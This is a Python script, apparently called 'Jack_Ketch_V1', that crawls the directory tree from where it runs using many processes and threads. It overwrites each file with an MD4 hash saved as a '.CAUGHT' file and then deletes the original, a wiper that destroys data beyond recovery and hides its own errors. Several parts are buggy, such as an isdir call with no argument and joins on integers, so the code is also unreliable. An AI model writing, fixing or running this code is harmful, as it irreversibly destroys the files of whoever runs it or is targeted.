from multiprocessing import Process
from Crypto.Hash import MD4
import threading
import os
def hashFileContents(target_file:str):
    try:
        file_data = b''
        with open(target_file, 'rb') as file:
            file_data = file.read()
            file.close()
        md4_hasher = MD4.new()
        md4_hasher.update(str(file_data).encode('utf-16le'))
        with open(f"{target_file}.CAUGHT", 'wb') as file:
            file.write(md4_hasher.digest())
            file.close()
        os.remove(target_file)
    except PermissionError:
        pass
    finally:
        return
def diveIntoDirectory(target_directory:str, depth:int, max_depth:int, process_limit:int, thread_limit:int):
    processes = []
    threads = []
    os.chdir(target_directory)
    for item in os.listdir():
        if os.path.isdir(f"{target_directory}\\{item}"):
            if depth > max_depth:
                if len(threads) > thread_limit:
                    for thread in threads:
                        try:
                            thread.join()
                        except Exception:
                            pass
                        finally:
                            threads.remove(thread)
                    try:
                        processes[0].join()
                    except Exception:
                        pass
                    finally:
                        processes.remove(processes[0])
                else:
                    thread_handle = threading.Thread(target=diveIntoDirectory, args=(f"{target_directory}\\{item}", depth + 1, max_depth, int(process_limit / 2) + 1, int(thread_limit / 2) + 1))
                    thread_handle.start()
                    threads.append(thread_handle)
            else:
                if len(processes) > process_limit:
                    for process in range(0, int(len(processes) / 2)):
                        try:
                            process.join()
                        except Exception:
                            pass
                        finally:
                            processes.remove(process)
                else:
                    process_handle = Process(target=diveIntoDirectory, args=(f"{target_directory}\\{item}", depth + 1, max_depth, int(process_limit / 2), int(thread_limit / 2)))
                    process_handle.start()
                    processes.append(process_handle)
        else:
            if len(threads) > thread_limit:
                for thread in range(0, int(len(threads) / 2)):
                    try:
                        thread.join()
                    except Exception:
                        pass
                    finally:
                        threads.remove(thread)
    while len(threads) > 0:
        for thread in threads:
            try:
                thread.join()
            except Exception:
                pass
            finally:
                continue
    while len(processes) > 0:
        for process in processes:
            try:
                process.join()
            except Exception:
                pass
            finally:
                continue
    return
processes = []
threads = []
current_dir = os.curdir
for item in os.listdir():
    if os.path.isdir():
        process_handle = Process(target=diveIntoDirectory, args=(f"{current_dir}\\{item}", 1, 10, 4, 8))
        process_handle.start()
        processes.append(process_handle)
    else:
        if item != "Jack_Ketch_V1.py":
            thread_handle = threading.Thread(target=hashFileContents, args=(f"{current_dir}\\{item}",))
            thread_handle.start()
            threads.append(thread_handle)
while len(threads) > 0:
    for thread in threads:
        try:
            thread.join()
        except Exception:
            pass
        finally:
            continue
while len(processes) > 0:
    for process in processes:
        try:
            process.join()
        except Exception:
            pass
        finally:
            continue
